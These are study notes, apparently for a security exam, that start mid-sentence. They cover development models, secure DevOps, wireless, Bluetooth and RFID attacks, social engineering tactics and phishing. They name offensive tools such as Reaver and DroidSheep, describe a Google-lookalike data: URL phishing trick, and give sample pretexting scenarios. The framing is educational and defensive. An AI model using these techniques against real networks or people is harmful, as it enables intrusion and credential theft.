  - example, if a customer realizes a change in the requirements is needed, it isn’t possible to implement this change until the maintenance stage.
Agile 灵巧的 model: uses a set of principles shared by cross-functional teams.
  - These principles stress interaction, creating a working application,
collaborating with the customer, and responding to change.
  - uses iterative cycles.   - Each cycle creates a working, if not complete, product. Testers verify the productworks with the current features and then developers move on to the next cycle.The next cycle adds additional features, often adding small, incremental changes from the previous cycle.
key difference:
  - agilemodel:emphasizes interaction between customers, developers,
and testers during each cycle.
  - can be effective if the customer has a clear idea of the
requirements.
  - If not, the customer changes during each cycle, extending the project’s timeline.
  - waterfall model: encourages interaction with customers during the requirements stage, but not during the design and implementation stages.
Secure DevOps
DevOps: combines development and operations, an agile-aligned software development methodology.
Secure DevOps:
a software development process
includes extensive communication between software developers and operations personnel.
includes security considerations throughout the project.
allow developers to push out multiple updates a day in response to changing business needs.
Some concepts included in secure DevOps project:
  - Security automation: uses automated tests to check code. software bugs or security flaws.
  - common: include a mirror image of the production environment
and run automated tests on each update to ensure it is error free.
  - Continuous integration: merging code changes into a central
repository.
  - Software is then built and tested from this central repository.
  - The central repository includes a version control system,
  - version control system: supports rolling back code changes when cause a problem.
  - Baselining: applying changes to the baseline code every day and building the code from these changes.
  - Example:
  - five developers are working on different elements of the same
project.
  - Each modified and verified some code on their computers.
  - At the end of the day, each uploads and commits their changes.
  - Someone then builds the code with these changes and then automation techniques check the code.
  - Benefit: bugs are identified and corrected quicker.
  - In contrast, if all the developers applied their changes once a
week, the bugs can multiply and be harder to correct.
  - Immutable systems: cannot be changed.
  - Within the context of secure DevOps, it’s possible to create and test systems in a controlled environment.
  - Once they are created, they can be deployed into a production environment.   - Example:
  - it’s possible to create a secure image of a server for a specific
purpose.
  - This image can be deployed as an immutable system to ensure it stays secure.
  - Infrastructure as code:
  - managing and provisioning data centers with code that defines
virtual machines (VMs).
  - many VMs are created with scripts. Once the script is created, new VMs can be created just by running the script.
Version Control and Change Management
change management policies for IT systems: ensure that changes to systems do not cause unintended outages.
Secure coding use version control and change management practices for the same reason, prevent unintended outages.
Change management: ensure that developers do not make unauthorized changes. any changes go through a specific, predefined process.
Allows to examine the change to ensure it won’t cause unintended consequences. any change to the application becomes an added responsibility.
If the customer discovers a bug due to this change after it ’s delivered, the developer may be responsible for fixing it, even if it wasn’t authorized.
preventing unauthorized changes and related problems,
provides an accounting structure to document the changes.
Once a change is authorized and implemented, the change is documented in a version control document.
Version control: tracks the versions of software as it is updated, including who made the update and when.
Many advanced software development tools include sophisticated version control systems.
Developers check out the code to work on it and check it back into the system when they’re done.
The version control system can document every single change madeby the developer.
allows developers to roll back changes to a previous version when necessary.
Provisioning 供应 and Deprovisioning 取消配置 to user accounts:
Provisioning: administrators create the account and give the account appropriate privileges to access various resources.
Deprovisioning an account: emoving access to these resources, as simple as disabling the account.
secure application development and deployment concepts, to an application: Provisioning an application: preparing and configuring the application to launch on
 different devices and to use different application services.
example, The app needs to be properly provisioned with the appropriate code on the target device to use these services.
Deprovisioning an app: removing it from a device.
example, delete the app, the app should be able to remove it completely. Leaving
remnants of the app consumes resources on the device.
Wireless Vulnerabilities
Wireless systems are vulnerable to all of the same attacks as wired networks.
  - There are several known attacks against wireless networks.
  - Most can be avoided by using strong security protocols (like WPA2
with CCMP)
  - WPA is vulnerable to many attacks, especially when using TKIP.
Intercepted: because these protocols use radio frequency signals for data emanation 发射:
  - all radio frequency signals can be easily intercepted.
  - To intercept 802.11x traffic, only need a PC with appropriate 802.11x
card installed.
  - Simple software on the PC can capture the link traffic in the wireless AP and then process this data in order to decrypt account and password information.
SSID broadcast/cloaking: Many networks regularly broadcast their name to announce their presence.
  - To protect the network: disable/turn off the SSID broadcast.
  - The access point is still there and accessible, and prevents those who are just scanning from finding it.   - This is considered a very weak form of security: because there are still other complicated ways to discover the presence of the access point even no SSID broadcast.
  - 1) Completely disable the sending of beacons
  - 2) Disable reponses to a broadcast probe request
  - except in cases where the probe request was explicitly addressed to the correct SSID (ignore broadcast probe requests to the wildcardSSID) and was from an authorized client (apply MAC Address filtering), and even send a null SSID in the probe responses to those.
Site surveys: listening in on an existing wireless network using commercially available technologies.
  - allows intelligence, data capture, to be performed on systems in your wireless network.
  - The term initially meant: determining whether a proposed location was free from interference.
  - When used by an attacker: determine what types of systems, protocols are used, and other critical information about your network.
  - It’s the primary method used to gather information about wireless networks.
  - Virtually all wireless networks are vulnerable to site surveys.
Replay attack (wireless)
a kind of access or modification attack, quite common. captured information over a network, then reused for a purpose other than intended. captures data sent between two entities, modifies it, and then attempts to
impersonate one of the parties by replaying the data.
Example:
  - distributed environment, logon and password information is sent between the client and the authentication system.
  - The attacker can capture the information and replay it later.
  - This can also occur with security certificates from systems like Kerberos.
WPA2 using CCMP and AES to prevent wireless replay attacks.
But WPA using TKIP is vulnerable to replay attacks.
WPA uses sequence counter: to number the packets and an access point will reject packets received out of order.
TKIP uses a 64-bit Message Integrity Check (MIC) to verify the integrity of the packets.
While this sounds secure, security experts identified a method to discover the MIC key.
After discovering the key, an attacker can transmit and decrypt packets.
Later, other security experts improved this attack allowing them to launch a replay attack. This is one of the reasons that TKIP was deprecated in 2012 and should not be used. IV Attacks
A wireless initialization vector (IV) attack:
attempts to discover the IV and uses it to discover the passphrase (the pre-shared
key)
The IV is simply a number.
Some wireless protocols use an IV by combining it with the pre-shared key to encrypt data-in-transit.
Wi-Fi Protected Access II (WPA2) isn’t susceptible to an IV attack.
An IV attack is successful when an encryption system reuses the same IV. made possible due to weaknesses in Wired Equivalent Privacy (WEP).
  - The initialization vector (IV) that WEP uses for encryption is a relatively small 24-bit number
  - Weaknesses: encryption algorithms (RC4) are employed.
  - cracked in 5 minutes using available PC software.
  - For this reason, WEP is one of the most vulnerable security protocols.
  - This small IV results in wireless networks reusing keys.
In many IV attacks, the attacker uses packet injection techniques to add additional
packets into the data stream.
  - The AP responds with more packets
  - increasing the probability that it will reuse a key.
  - packet injection decreases the time it takes to crack a WEP key to a very short time, may less than a minute.
It’s worth repeating that WEP has been deprecated and should not be used.
 IV attack: by examining the repeating result, attackers crack the WEP secret key.
  - Since the IV is shorter than the key, it must be repeated when used. To put it in perspective, the attack happened because the algorithm used is RC4, the IV is too small, static, and is part of the RC4 encryption key.
the only time to use WEP is when you must have compatibility with older devices that do not support new encryption.
⁃
Temporal Key Integrity Protocol (TKIP)
  - To strengthen WEP encryption
  - placed a 128-bit wrapper around the WEP encryption with a key that is based on things such as the MAC address of the destination device and the serial number of the packet.
  - TKIP was designed as a backward-compatible replacement to WEP, and it could work with all existing hardware.
  - Without the use of TKIP, WEP was very weak, worth noting, however, that even TKIP has been broken.
 Rogue APs and Evil Twins
Weak encryption was an issue with earlier access points, but most of the newer wireless APs use special ID numbers (SSIDs) and must be configured in network cards to allow communication.
However, using ID number configurations doesn’t necessarily prevent wireless networks from being monitored.
One particularly mischievous undertaking involves taking advantage of rogue access points: also called counterfeit access points
An unauthorized wireless access point added to your network. attacker, or user wanting to enhance their environment.
  - Not managed properly, increase vulnerabilities to network.
  - not implement the same level of security that you would
  - open up the system for a man-in-the-middle attack or evil twin attack.
Attackers may connect a rogue access point to network devices in wireless closets that lack adequate physical security.
This access point acts as a sniffer:
  - to capture traffic passing through the wired network device
  - broadcasts the traffic using the wireless capability of the AP.
  - The attacker can then capture the exfiltrated data files while sitting in the parking lot.
  - Data exfiltration: unauthorized transfer of data from an organization to a location controlled by an attacker.   - This works the same way that regular users can connect to a wired network via a wireless network.
  - The difference is that the attacker configures all the security for the counterfeit access point and can use it for malicious purposes.
If you discover an unauthorized AP, you should disconnect it as quickly as possible.
A basic first step: to contain or isolate the threat.
By simply unplugging the Ethernet cable, you can stop the unauthorized AP from capturing network traffic.
evil twin attack: a rogue wireless access point poses as a legitimate wireless service provider to intercept information that users transmit.
Evil Twin
a rogue access point with the same SSID as a legitimate access point.
  - attacker set up an AP using the same SSID as the public Wi-Fi
network, unsuspecting users will connect to this evil twin.
  - Once a user connects to an evil twin, wireless traffic goes through the evil twin instead of the legitimate AP.
  - presents bogus logon pages to users to capture usernames and passwords.
  - Or simply capture traffic from the connection, like email or text typed into web page text boxes, and analyze it to detect sensitive information.
set up an evil twin is easy.
  - Attackers can configure a laptop that has a wireless access card as an AP.
  - With it running, the attackers look just like any other user in a coffee shop
  - you’ll have no idea that you use the Internet via theevil twin.
  - Similarly, attackers can set one up in a parking lot or another location close to an organization and try to trick employeesor visitors.
Often, administrators will use wireless scanners to perform site surveys.
In addition to detecting noise on frequency bands, they can also detect rogue
APs, evil twins.
The site survey can help them identify the physical location of access points because the signal will get stronger as the administrator gets closer.
Jamming
Interference can be: unintentional (example caused by other devices in the vicinity) or intentional.
Intentional:
transmit noise or another radio signal on the same frequency used by a wireless network. seriously degrade performance.
jam the signal and prevents legitimate device from communicating.
intermittent connectivity causes them to lose their association with the AP and
forces them to try toreconnect.
  - a denial-of-service (DoS) attack
  - is a violation of federal law in most cases.
Powerful jammers are available that send a constant signal, can incapacitate a
network quickly.
  - constant jammers: easily detected, and administrators can implement antijamming procedures (like switching channels) to negate them.
  - low-powered jammers: troublesome to identify, some of which hide by sending out signals and then stopping, hiding for a while, and then sending out signals again.
Solution:
In some cases, you can increase the power levels of the AP to overcome the attack. Or use different wireless channels.
  - Each wireless standard has several channels you can use, and if one channel is too noisy, you can use another one.
Although this is useful to overcome interference in home networks, it won’t be as effective to combat an interference attack.
  - If you switch channels, the attacker can also switch channels.
WPS Wi-Fi Protected Setup
To simplify network setup, routers use a series of EAP (Extensible Authentication Protocol) messages, to allow new hosts to join the network and use WPA/WPA2 (Wi-Fi Protected Access versions 1/2).
often requires something to complete the enrollment: like a PIN...
WPS allows users to configure wireless devices without typing in the passphrase
  - Instead, users can configure devices by pressing buttons
  - or by entering a short eight-digit personal identification number (PIN).
Example: configure a new wireless device by pressing a button on the AP and on the wireless device.
  - buttons can be physical buttons or virtual via app or web.
  - It will automatically configure the device within about 30 seconds
with no other actions needed.
When using the PIN method, users first identify the eight-digit PIN on the AP and then enter the PIN on the new wireless device.
WPS attacks:
become commonplace, susceptible to brute-force attacks.
  - keeps trying different PINs until it succeeds
Once an attacker gains access, they are then on the Wi-Fi network.
  - Example:
  - Reaver is an open source free tool, allows attackers to discover the
PIN within 10 hours, or quicker.
  - Once it discovers the PIN, it can then discover the passphrase in both WPA and WPA2 wireless networks.
Security experts recommend disabling WPS on all devices
  - possible via the AP configuration page.
  - Even if you choose to enable WPS to easily connect some devices, you should immediately turn it off once you’re done.
update the firmware in those where it is a possibility. Mobile Attacks
SMS phishing
Example: Almost every vendor from airlines to UPS packaging gives updates via text, and the practice is growing quickly. How easy would it be to just send User Joe a text message telling him, “You have a package coming. Click Here to track”? Definitely something to think about.
Trojans available for all sorts of hilarity is almost without end.
- Notable Android Trojans: Obad, Fakedefender, TRAMP.A, and
ZitMo.
Spyware
- Mobile Spy, Spyera
- make it really easy to listen in on or even watch what the target is doing.
And if that’s not enough, the tools we use to manage our own devices can be used against us. Ever heard of Google Voice? How about Remote Wipe from Google? One loose password and mobile device hacking becomes a nightmare.
tracking location:
- AndroidLost, Find My Phone, Where’s My Droid
- were designed to help me find lost phone, but can be used to track where I happen to be at. Wouldn’t it be helpful to know where ▪


## folks are at during a social engineering visit to the site?
NOTE Stagefright (https://en.wikipedia.org/wiki/Stagefright_(bug)) is the name given to a bunch of software bugs affecting Android operating systems. In short, many of the fancier options for making messages and media transfer more fun for your average teen have allowed attackers to perform remote code execution and privilege escalation.
using mobile device as an attack platform
- Tools:
- Network Spoofer allow you to control how websites appear on a desktop/laptop.
- DroidSheep allows you to perform sidejacking by listening to wireless packets and pulling session IDs.
- Nmap works great on a mobile device, and sniffers are a dime a dozen. Heck, you can even install Kali Linux on the thing and turn it into a full-featured hacking machine.
Bluetooth Attacks
Bluetooth: connecting devices, wirelessly over a short distance.
- since we keep everything on our devices, hacking that signal could pay huge dividends.
Simplest prevention: not to set their attribute to Discoverable.
The major Bluetooth attacks:
- Bluesmacking 猛烈地: simple denial-of-service attack against the device.
 - Bluejacking: Sending unsolicited messages (think spam) over a Bluetooth connection. to, and from, mobile devices.
  - relatively harmless, but cause confusion to users
  - sending of unsolicited messages over Bluetooth via the OBEX
protocol.
  - BBProxy, a Blackberry-centric tool
- Bluesniffing: to discover Bluetooth-enabled devices, like war driving in
wireless hacking.
- Bluebugging: Successfully accessing a Bluetooth-enabled device and
remotely using its features.
  - like bluesnarfing, but a step further.
  - In addition to gaining full access to the phone, the attacker installs a
backdoor.
  - Attackers can also listen in on phone conversations, enable call forwarding, send messages...
  - have the phone call the attacker at any time, listen in on conversations within a room.
- Bluesnarfing: The actual theft data from a mobile device.
  - Gain unauthorized access through a Bluetooth connection.
  - access can be obtained through a smartphone or any Bluetooth device.
  - Once access has been achieved, the attacker can copy data...
  - can access info: email, contact lists, calendars, and text messages.
  - Attackers use tools such as hcitool and obexftp.
 ▪


## - Blueprinting: as footprinting for Bluetooth: involves collecting device info over Bluetooth.
first action: to find the Bluetooth devices.
- BlueScanner (from SourceForge): finding devices around you, it will also try
to extract and display as much information as possible.
- BT Browser: finding and enumerating nearby devices.
- Bluesniff, btCrawler: providing nice GUI formats
- Blooover: good choice for bluebugging,
- PhoneSnoop: spyware on a Blackberry.
start taking advantage of and hacking the devices nearby.
- Super Bluetooth Hack: an all-in-one software package, allows to do almost
anything you want to a device you’re lucky enough to connect to.
  - If the device is a smartphone, you could read all messages and contacts, change profiles, restart the device, and even make calls as if they’re coming from the phone itself.
Bluetooth technology is often used for creating personal area networks (PANs or WPANs)
and most Bluetooth devices come with a factory-default PIN that you will want to change to more secure values.
 ▪


##  2 vulnerabilities have been added: bluejacking and bluesnarfing.
- The range of Bluetooth was originally designed for about three meters (about 10 feet)
- Some common attacks are bluejacking, bluesnarfing, and bluebugging: When Bluetooth devices are first configured, they are configured in Discovery
mode.
- Bluetooth devices use MAC addresses
- Discovery mode: Bluetooth device broadcasts its MAC address, allowing other devices to see it and connect to it.
- This is required when pairing Bluetooth devices.
  - earlier versions of Bluetooth, this pairing process could happen any time a device is in Discovery mode.
  - most software vendors rewritten their software to prevent this.
- Today, users typically manually pair the device.
  - If a user doesn’t acknowledge an attempted pairing, it fails.
  - As a result, Bluetooth attacks are rare today.
- However, if a device doesn’t require manually pair a device, it is still
susceptible to these attacks.
NFC and RFID
Near field communication (NFC):
a group of standards used on mobile devices
  - new standard, built on the older standards created for RFID (allows compatible hardware both to supply power to and to communicate with an otherwise unpowered and passive electronic tag using radio waves)
  - RFID, widely used: identification, authentication, tracking applications... allow them to communicate with other mobile devices when they are close to them.
  - Example:
  - Share data with friends, placing the smartphones close to each other, and selects it to download.
  - payment systems, two phones to “bump” and trans data.
  - tends to use 4cm (1.6 inches) as the distance.
requires a user to bring the client close to the AP in order to verify. often through radio frequency identification (RFID) or Wi-Fi.
NFC Attacks
an attacker uses an NFC reader to capture data from another NFC device. One method is an eavesdropping attack. The NFC reader uses an antenna to boost its range, and intercepts the data transfer between two other devices.
A more advanced attack was discovered in 2012. They designed Trojan malware and installed it on an Android-based smartphone.
  - They used the Trojan to initiate a payment. The NFC reader was then able to capture the payment data and use it in a live payment transaction. Google quickly modified Google Wallet to prevent this type of attack.
RFID Attacks
Radio-frequency identification (RFID) systems:
include an RFID reader and RFID tags placed on objects.
They are used to track and manage inventory, any type of valuable assets (objects and animals)
There’s an almost endless assortment of tags available for multiple purposes. This includes tags implanted into animals, packaging for any type of product (such as computers), pharmaceuticals, transportation systems (such as shipping containers, railcars, and busses), and controlled substances (such as pharmaceutical containers).
Some tags are only slightly larger than a grain of rice.
Tags do not have a power source.
Instead, they include electronics that allow them to collect and use power to
transmit data stored on the device.
This is similar to how a proximity card, receives a charge from a proximity card
reader and then transmits data to the reader.
One difference is that RFID transmitters can transmit to and from tags from a much greater distance than proximity readers.
Some of the common RFID attacks include: Sniffing or eavesdropping.
  - Because RFID transmits data over the air, it’s possible for an attacker to collect it by listening.
  - Requirement: know the frequency used by the RFID system and have a receiver that can be tuned to that frequency, the protocols used by the
 RFID system to interpret the data. Replay:
  - Successful eavesdropping attacks allow the attacker to perform a replay attack.
  - Example: an attacker can configure a bogus tag to mimic the tag attached to a valuable object. The attacker can then steal the valuable object without the theft being easily detected.
DoS: disrupt services.
  - If an attacker knows the frequency used by the RFID system, it’s possible to launch a jamming or interference attack, flooding the frequency with noise.
  - prevents the RFID system from operating normally.
Disassociation 分裂 /deauthentication attack
a type of DoS attack
removes a wireless client from a wireless network.
- Normal operation:
- After a wireless client authenticates with a wireless AP   - the two devices exchange frames, causing the client to be associated with the AP.
- At any point, a wireless device can send a disassociation frame to the AP to terminate the connection.
- This frame includes the wireless client’s MAC address.
- When the AP receives the disassociation frame, it deallocates all the memory
it was using for the connection. Disassociation attack:
attackers send a disassociation frame to the AP with a spoofed MAC address of the victim.
The AP receives the frame and shuts down the connection.
The victim disconnected from the AP, must authentication again to reconnect. Since the victim is unable to keep a connection with the AP, it increases their
chances of choosing to use another AP (rogue one or the one they have to pay)
  - Example: many hotels were using this attack :
  - generate revenue by requiring guests to pay for “premium” services than the free Wi-Fi.
  - iPhone, enable the Personal Hotspot feature. This lets you share the connection with other devices, such as a laptop.
  - Some hotels looked for these personal wireless networks, and launched disassociation attacks against them.
  - Customers were then forced to pay for the hotel’s wireless services.
  - example, the Federal Communications Commission (FCC) fined Marriott Hotel Services $600,000 for launching attacks on its customers that prevented them from using their personal wireless networks. Compare and contrast various types of controls.
administrative control A control implemented through administrative policies or procedures. cable lock A physical security deterrent used to protect a computer.
cold aisles Server room aisles that blow cold air from the floor.
compensating controls Gap controls that fill in the coverage between other types of vulnerability mitigation techniques. (Where there are holes in coverage, we compensate for them.)
control Processes/actions used to respond to situations/events.
control types Technical, physical, or administrative measures in place to assist with resource
management.
data disposal Getting rid of/destroying media no longer needed.
detective control Controls that are intended to identify and characterize an incident in progress (example, sounding the alarm and alerting the administrator).
dumpster diving Looking through trash for clues—often in the form of paper scraps—to find users’ passwords and other pertinent information.
Faraday cage An electrically conductive wire mesh or other conductor woven into a “cage” that surrounds a room to prevent electromagnetic signals from entering or leaving the room through the walls. (Physical security control type)
fire suppression The act of stopping a fire and preventing it from spreading.
hoax Typically, an email message warning of something that isn’t true, such as an outbreak of
a new virus, to send users into a panic and cause more harm than the virus. hot aisles A server room aisle that removes hot air. impersonation Pretending to be another person to gain information.
information classification The process of determining what information is accessible, to what
parties, and for what purposes.
mantrap A device, such as a small room, that limits access to one or a few individuals. Mantraps typically use electronic locks and other methods to control access.
PASS method The correct method of extinguishing a fire with an extinguisher: Pull, Aim, Squeeze, and Sweep.
perimeter security: Security set up on the outside of the network or server to protect it. Personal Identity Verification (PIV): Card required of federal employees and contractors to
gain access (physical and logical) to government resources.
personally identifiable information (PII): Information uniquely used to identify, contact, or locate a single person. Examples ssn, driver’s license number, fingerprints, and handwriting.
phishing A form of social engineering in which you simply ask someone for a piece of information that you are missing by making it look as if it is a legitimate request. Commonly sent via email.
physical controls Controls and countermeasures of a tangible nature intended to minimize intrusions.
preventive controls Controls intended to prevent attacks or intrusions.
privacy A state of security in which information isn’t seen by unauthorized parties without the
express permission of the party involved.
privacy filters Screens that restrict viewing of monitors to only those sitting in front of them.
PTZ: Cameras that can pan, tilt 倾斜, and zoom.
restricted information Information that isn’t made available to all and to which access is
granted based on some criteria.
shoulder surfing Watching someone when they enter their username, password, or sensitive data.
social engineering An attack that uses others by deceiving them. It does not directly target hardware or software, but instead it targets and manipulates people.
spear phishing A form of phishing in which the message is made to look as if it came from someone you know and trust as opposed to an informal third party. tailgating Following someone through an entry point.
technical controls Controls that rely on technology.
vishing Combining phishing with Voice over IP (VoIP).
watering hole attack Identifying a site that is visited by those that they are targeting, poisoning that site, and then waiting for the results.
wetware Another term for social engineering. whaling Phishing only large accounts.
Understanding Social Engineering
Social engineering
the process
intruders gain access to your facilities, network, employees... by exploiting the generally trusting nature of people.
A social engineering attack may come from someone posing as a vendor, or it could take the form of an email from a (supposedly) traveling executive who indicates that they have forgotten how to log on to the network or how to get into the building over the weekend.
difficult to determine if the individual is legitimate or not.
social engineering is also referred to as wetware: a form of hacking that does not require software or hardware but rather the gray matter of the brain.
can develop subtly, hard to detect. classic social engineering attacks.
  - Impersonation: Someone enters your building, identifies himself as a copier repairman to do preventive service. In most cases, the receptionist will let him pass and tell him the location of the copier..
  - For manned check-points: an old employee badge, cut the picture and ▪


## pasted in a picture of Mickey Mouse.
反向社会工程 (Reverse Social Engineering)
定义: 迫使目标人员反过来向攻击者求助的手段 步骤:
  - 破坏 (Sabotage) — 对目标系统获得简单权限后，留下错误信 息，使用户注意到信息，并尝试获得帮助
  - 推销 (Marketing) — 利用推销确保用户能够向攻击者求助，比如 冒充是系统维护公司，或者在错误信息 里留下求助电话号码
  - 支持 (Support) — 攻击者帮助用户解决系统问题，在用户不察觉
     的情况下，并进一步获得所需信息
Principles Behind Social Engineering
Social engineers and other criminals employ several psychology-based principles to help increase the effectiveness of their attacks.
Authority 官方:
  - trick that you are in a position of authority,
  - less likely to question your request.
  - position of authority: management, tech support, HR, or law enforcement.
  - Example: Impersonation, Whaling, Vishing
Intimidation 恐吓
  - Authority can be a source of intimidation, it is possible for intimidation to
occur in its absence as well.
  - Can be done with threats, shouting, guilt...
  - most effective: impersonation, vishing attacks.
 Consensus 一致同意
  - Putting the person being tricked by putting the focus on them, listening,
validating, charming them.
  - By being nice, no intentions could possibly be harmful.
  - People are often more willing to like something that other people like.
  - Some attackers take advantage of this by creating web sites with fake testimonials that promote a product.
  - Using consensus, also called social proof:
  - most effective with Trojans and hoaxes.
  - install a Trojan if everyone seems to indicate it’s safe.
  - Similarly, if a person suspects a virus notice is just a hoax, but everyone seems to be saying it’s real, the victim is more likely to be tricked.
Scarcity 缺乏
  - tricking that there is a limited supply of something.
  - often effective with phishing and Trojan attacks. People make quick decisions without thinking them through.
  - Example:
  - only 100 vacation requests will be honored
  - they need to go to a fictitious website now and fill out information.
Familiarity 熟悉
  - Mental guards are lowered when dealing with individuals that we like.
  - someone have the same interests as we do, engaged in same activities, working to gain positive attention.
  - most effective with shoulder surfing and tailgating attacks. Trust
  - attempt to build a trusting relationship between them and the victim. often takes a little time, but the reward can be worth it.
  - gain trust is through reciprocation互换, does something for you, makes you feel that you owe that person something.
  - Example: to gain your trust, someone help you out of a troublesome situation or buy you lunch.
  - Vishing attacks often use this method. Urgency
  - convince the individual that time is of the essence. If they don’t do right now, money will lost, nonexistent intruder will get away, the company
will suffer irreparable harm, a plethora 过多 of other negative possibilities may occur.
  - most effective with ransomware, phishing, vishing, whaling, and hoaxes.
 Impersonates a company's managing staff member to manipulate a lower rank employee into disclosing confidential data. The attacker informs the victim that the information is essential for a task that needs to be completed within the business hours on the same day and mentions potential financial losses for the company in case the victim refuses to comply.
authority + Urgency + intimidation
 Impersonate a software beta tester replies to a victim's post in a forum thread discussing the best options for affordable productivity software. A while later, he/she follows up by sending
the victim private message mentioning the discussion thread and  offering free access to a closed beta version of a fake office app. Familiarity + Trust +Scarcity
Shoulder Surfing
looking over the shoulder of someone to gain information. to gain unauthorized information by casual observation
  - learn credentials
  - Attackers using cameras to monitor (ATMs).
  - Passwords entered on Apple by default display the last letter, increases
the dangers.
prevent shoulder surfing:
survey your environment before entering personal data.
  - position monitors and other types of screens so that unauthorized personnel cannot see them.
  - ensuring people can’t view them by looking through a window or from reception areas.
use screen filter
  - placed over the monitor, restricts the visibility of the screen unless
looking directly at the monitor.
Tricking with Hoaxes 戏弄
Hoax: a message, often through email, tells of impending doom from a virus or
other security threat that simply doesn’t exist.
  - encourage Users to delete files or change their system configuration.
  - or prompting them to share the message with others
Example
teddy bear virus (jdbgmgr.exe),
  - not a virus at all.
   - Victims received an email saying this virus will destroy the system.
  - protect their system by deleting the file (icon of a little bear),
  - Users who deleted the file lost some system capability.
Good Time and Irina viruses.
  - Both viruses do things that are impossible to accomplish with a virus.
  - When you receive a virus warning, you can verify its authenticity by looking on CERT.
  - CERT organization (www.cert.org), get the status of the latest viruses, monitors and tracks viruses, provides regular reports on this site.
  - Symantec(www.symantec.com/business/security_response/threatexplorer/ risks/hoaxes.jsp). You can always check there to verify whether an email you’ve received is indeed a hoax.
any email that says “forward to all your friends” is a candidate for hoax research.
More serious virus hoaxes have the potential to be as damaging as a real virus.
If users delete important files, they may make their systems unusable.
Additionally, they waste help-desk personnel’s time due to needless calls about users damaged their systems in response to the hoax.
When you receive an email suspect is a hoax:
  - check the CERT site before forwarding the message to anyone else.
  - CERT organization (www.cert.org), get the status of the latest viruses, monitors and tracks viruses, provides regular reports on this site.
  - Symantec(www.symantec.com/business/security_response/threatexplorer/ risks/ hoaxes.jsp). You can always check there to verify whether an email you’ve received is indeed a hoax.
 Meme: Any concept that spreads quickly through the Internet.
Tailgating and Mantraps
- Tailgating: one person following closely behind another without showing credentials.
  - Employees often do this as a matter of convenience and courtesy.
  - Also called piggybacking
physical security controls: mantraps, security guards...
Mantrap: can be a turnstile like those used in subways or bus stations. Security guards: check the credentials of each person.
Dumpster Diving
Dumpster diving: searching through trash / recycling containers to gain information from discarded documents.
Documentation with any type of Personally Identifiable Information (PII) or Protected Health Information (PHI) should be shredded or burned.
Watering Hole Attacks
- watering hole: discover web sites a group of people are likely to visit and then infects those web sites with malware that can infect the visitors.
  - infect a web site that users trust already, making them more likely to download infected files. ▪


## - Example:
- an attack in late 2016 initially targeted Polish banks. The attack was discovered by a single Polish bank that discovered previously unknown malware on internal computers. Symantec reported the source of the attack was servers at the Polish Financial Supervision Authority. This is a well- trusted institution by Polish bank employees, and they are likely to visit the organization’s web sites often.
- over 100 similar attacks located in over 30 countries.
- Example:
  - attacker wants to gain unauthorized access to the servers at Spencer Industries
  - attacker discovers that Spencer does not host its own email but outsources a cloud provider.
  - focus on the weakness of the cloud provider.
  - On the cloud provider’s email site, install the malware du jour,
  - wait until a Spencer employee gets infected, and suddenly have the access they coveted.
The best defense:
make certain that all of your partners are secure.
  - Identify weak links, bring them up to the same level of security as the rest of your infrastructure.
IT administrator: educating users (best way to prevent.)
a number of tools: help limit the success of social engineering attacks.
  - Most browsers can check websites visit against a database of known questionable sites, warns them if they find a match.
   ▪


## Spam
Spam: unwanted or unsolicited email.
between 80 percent and 92 percent of all Internet email is spam. Some spam is harmless advertisements, waste your time.
while more is malicious. include malicious links, code, or attachments.
legitimate companies encourage users to opt in to their email lists and then send them email about their products.
  - When users opt in to a mailing list, they agree to the terms.
  - agree to receive email from the company and that’s true.
  - However, terms often include agreeing to allow their partners to send
you email, which means company can share your email address with
others.
  - not malicious spam, but more than you want.
  - Once you opt out, shouldn’t receive any more emails from company.
Criminals use a variety of methods to collect email addresses.
  - buy lists from other criminals and harvest them from web sites.
  - Some malware scans address books of infected computers to collect
email.
  - they might include opt-out instructions in spam they send.
  - attackers use this as confirmation that your email address is valid. The result is more spam.
Phishing
sending email to users with the purpose of tricking them into revealing
 ▪


## - ▪


## ▪
an attacker has joined your friend’s computer to a botnet.
A bot herder is now using your friend’s computer to send out phishing emails.
Phishing to Install Malware
One phishing email looked like it was from a news organization with headlines of recent news events. If the user clicked anywhere in the email, it showed a dialog box indicating that the user’s version of Adobe Flash was too old to view the story. It then asked, “Would you like to upgrade your version of Adobe Flash?” If the user clicked Yes, it downloaded and installed malware.
Phishing to Validate Email Addresses
personal information or clicking on a link.
  - sending email tricking them into revealing personal information or clicking on a link.
  - ask for a piece of information missing, as if it is a legitimate request.
  - scam the user into surrendering private information, identity theft.
  - direct the user to website to update personal information, like password, credit card...
Example: An email like from a bank, state that there is a problem with the person’s account or access privileges.
One of the best counters: simply read the URL. If it is the legitimate URL.
Email from Friends
  A simple method to validate email addresses: beacons. Beacon:
  - a link included in the email that links to an image stored on an Internet
server.
  - The link includes unique code that identifies the receiver’s email address.
For the email application to display the image, it must retrieve the image from the Internet server.
When the server hosting the image receives the request, it logs the user’s email address, indicating it’s valid.
This is one of the reasons that most email programs won’t display images by default.
Phishing to Get Money
This scam often requires the victim to pay a small sum of money with the promise of a large sum of money.
Lottery scams inform email recipients they won. Victims sometimes have to pay small fees to release the funds or provide bank information to get the money deposited.
New Phishing Attacks
criminals are also launching new phishing attacks.
best way to prevent attacks: educate people about what the criminals are doing now.
Example:
criminals crafted a sophisticated attack on Gmail users that fooled even tech- savvy users.   - captured the Gmail credentials of one user, logged on, scoured it for sent emails, attachments, and subject lines.
  - used this account to send emails to people this person previously emailed, often using similar subject lines.
  - Additionally, include a thumbnail of a document.
  - clicking the thumbnail provides a preview of the document. However, this instead opened up another tab within the browser with a URL like this: data:text/html,https://accounts.google.com/ServiceLogin? service=mail...
  - accounts.google.com, looks legitimate.Additionally, the page shows a sign-in page that looks exactly like the Google sign-in page.
  - Users who were tricked into “logging on” on this bogus but perfectly created web page were compromised.
  - Attackers quickly logged on to this account and started the process all over again, hoping to snare other unsuspecting users.
In one publicized example
  - the attackers used a compromised account to resend a team practice schedule to all the members of the team.
  - It included a similar subject line and screenshot of the original attachment.
  - Some recipients who received the email clicked the thumbnail and were taken to the same URL with accounts.google.com in it.
  - Some were tricked and entered their credentials to apparently log on to Google.
  - Attackers quickly logged on to the newly compromised accounts and started the process again. 矛 Spear Phishing
a unique form of phishing
targets a specific organization
an e-mail spoofing fraud attempt that targets a specific organization, seeking
unauthorized access to confidential data.
the message is made like from someone you know and trust, not informal third party.
  - spear phishing messages appear to come from a trusted source. an individual within the recipient's own company, someone in a position of authority.
  - Phishing messages usually appear to come from a large and well- known company or Web site with a broad membership base, like eBay or PayPal.
Example: a message that appears to be from your boss telling you that there is a problem with your direct deposit account and that you need to access this HR link right now to correct it.
works better than phishing: uses information from email databases, friends lists...
One solution: use digital signatures.
